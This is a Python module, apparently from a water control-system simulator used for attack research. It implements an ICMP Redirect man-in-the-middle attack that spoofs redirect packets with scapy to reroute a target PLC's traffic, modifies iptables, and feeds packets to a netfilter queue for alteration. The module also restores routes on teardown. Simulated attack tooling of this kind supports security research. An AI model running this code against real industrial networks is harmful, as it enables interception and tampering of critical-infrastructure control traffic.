import argparse
import os
import signal
import subprocess
import sys
import _thread
import time
from pathlib import Path

from wacsim.network_attacks.mitm_attack import MiTMAttack

class ICMPRedirectMiTMAttack(MiTMAttack):
    """
    ICMP Redirect Man-in-the-Middle attack.
    Redirects traffic from target PLC to SCADA/peer PLCs via spoofed ICMP Redirect packets.
    """
    def get_destinations(self):
        destinations = []
        if 'scada' in self.intermediate_yaml and self.intermediate_yaml['scada']:
            destinations.append(self.intermediate_yaml['scada']['local_ip'])
        for plc in self.intermediate_yaml['plcs']:
            if plc['local_ip'] != self.target_plc_ip:
                destinations.append(plc['local_ip'])
        return destinations

    def setup(self):
        """
        Setup the attack by adding iptables rules, starting the ICMP redirection thread,
        and launching the netfilter queue subprocess for selective packet modifications.
        """
        self.modify_ip_tables(True)
        self.launch_mitm(get_macs=False)

        # Run periodic ICMP Redirect refresh thread to keep route cache poisoned
        self.run_thread = True
        _thread.start_new_thread(self.refresh_poison, (self.ARP_POISON_PERIOD, self.ARP_POISON_PERIOD))

        queue_number = self.intermediate_attack['queue_num']
        nfqueue_path = Path(__file__).parent.absolute() / "mitm_netfilter_queue.py"
        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)

    def launch_mitm(self, get_macs=False):
        """Send spoofed ICMP Redirect packets to target PLC."""
        from scapy.layers.inet import IP, ICMP, UDP
        from scapy.all import send

        gateway_ip = self.intermediate_attack['gateway_ip']
        target_ip = self.target_plc_ip
        attacker_ip = self.attacker_ip

        destinations = self.get_destinations()
        self.logger.info(f"Sending ICMP Redirects (gw={attacker_ip}) to target {target_ip} for destinations: {destinations}")
        for dest in destinations:
            # Build and send ICMP Redirect packet
            packet = IP(src=gateway_ip, dst=target_ip) / ICMP(type=5, code=1, gw=attacker_ip) / IP(src=target_ip, dst=dest) / UDP(sport=44818, dport=44818)
            send(packet, verbose=False)

    def restore_routes(self):
        """Restore routing table by redirecting target PLC back to the original gateway."""
        from scapy.layers.inet import IP, ICMP, UDP
        from scapy.all import send

        gateway_ip = self.intermediate_attack['gateway_ip']
        target_ip = self.target_plc_ip

        destinations = self.get_destinations()
        self.logger.info(f"Restoring routes (sending ICMP Redirect to gateway {gateway_ip})")
        for dest in destinations:
            packet = IP(src=gateway_ip, dst=target_ip) / ICMP(type=5, code=1, gw=gateway_ip) / IP(src=target_ip, dst=dest) / UDP(sport=44818, dport=44818)
            send(packet, verbose=False)

    def teardown(self):
        """Undo IP tables changes, stop thread, restore routes, and terminate NFQueue."""
        self.run_thread = False
        self.restore_routes()
        self.modify_ip_tables(False)

        self.logger.info("Stopping nfqueue subprocess...")
        self.nfqueue_process.send_signal(signal.SIGINT)
        self.nfqueue_process.wait()
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.terminate()
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.kill()

def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start ICMP Redirect MitM attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int, metavar="N")
    args = parser.parse_args()

    attack = ICMPRedirectMiTMAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
